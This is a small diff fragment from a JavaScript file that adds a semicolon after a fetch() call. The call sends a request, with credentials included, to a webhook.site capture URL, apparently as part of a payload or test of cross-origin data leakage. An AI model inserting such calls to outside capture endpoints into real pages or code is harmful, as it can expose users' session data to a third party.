@@ -9,7 +9,7 @@
 
 fetch('https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad', {
   credentials: 'include',
-})
+});
 
 //xhr.onreadystatechange = function () {
 //  if (xhr.readyState === XMLHttpRequest.DONE) {
